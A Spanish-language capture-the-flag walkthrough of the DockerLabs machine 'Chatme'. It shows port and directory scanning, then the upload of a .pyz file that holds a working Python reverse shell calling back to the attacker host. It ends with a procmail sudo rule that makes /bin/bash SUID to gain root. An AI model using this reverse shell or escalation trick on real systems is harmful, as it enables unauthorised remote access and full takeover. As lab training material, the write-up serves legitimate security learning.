#MAQUINA #DOCKERLABS #MEDIO 
#ABUSO_SUBIDA_ARCHIVOS #RCE 
#EXTENSION_PYZ #PROCMAIL

<hr>

# RECONOCIMIENTO

Vamos a resolver **Chatme** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 11:36 CET
Initiating ARP Ping Scan at 11:36
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 11:36, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:36
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 11:36, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-25 11:36:28 CET for 0s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 11:38 CET
Nmap scan report for chat.chatme.dl (172.17.0.2)
Host is up (0.000027s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.30 seconds


```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 11:38 CET
Nmap scan report for chat.chatme.dl (172.17.0.2)
Host is up (0.0000060s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /login.php: Possible admin folder
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds



```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Usamos **gobuster** :

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,js,txt,png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://172.17.0.2/images/]
/index.html           (Status: 200) [Size: 7579]
/css                  (Status: 301) [Size: 178] [--> http://172.17.0.2/css/]
/js                   (Status: 301) [Size: 178] [--> http://172.17.0.2/js/]
/fonts                (Status: 301) [Size: 178] [--> http://172.17.0.2/fonts/]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================


```

```bash
gobuster dir -u http://chat.chatme.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg -b=302,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://chat.chatme.dl/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   302,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,js,txt,png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1891]
/uploads              (Status: 301) [Size: 178] [--> http://chat.chatme.dl/uploads/]
/index2.php           (Status: 200) [Size: 5769]
/chat.php             (Status: 200) [Size: 2]
/upload.php           (Status: 200) [Size: 147]
/css                  (Status: 301) [Size: 178] [--> http://chat.chatme.dl/css/]
/js                   (Status: 301) [Size: 178] [--> http://chat.chatme.dl/js/]
/LICENSE              (Status: 200) [Size: 35147]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================

```
# EXPLOTACION

Intento bypassear tanto **chat.php** como **upload.php** -> Sin resultado.

Pruebo con una vulnerabilidad conocida de extensiones **.pyz** :

```python

#!/usr/bin/python

import socket,subprocess,os,pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.17.0.1",443));os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

pty.spawn("/bin/bash")

```

Al subirlo y acceder nos da una shell :

```bash

http://chat.chatme.dl/uploads/wp.pyz

```

YA ESTAMOS COMO SYSTEM.

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUDO:

   ```bash
system@98c27b900143:~$ sudo -l
sudo -l
Matching Defaults entries for system on 98c27b900143:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User system may run the following commands on 98c27b900143:
    (ALL : ALL) NOPASSWD: /usr/bin/procmail

```

Vemos **procmail** con permisos SUDO, por una parte debemos crear un .procmailrc (sirve para hacer reglas a ejecutar con los mails -> tratamiento de mails):

```bash
TMPFILE=/tmp/prueba.txt

:0

| touch $TMPFILE ; chmod +s /bin/bash
```

Después enviamos un correo y usamos el filtro :

```bash

system@98c27b900143:~$ echo "H" | sudo /usr/bin/procmail -m .procmailrc 
system@98c27b900143:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
system@98c27b900143:~$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# 

```

**YA ESTAMOS COMO ROOT.**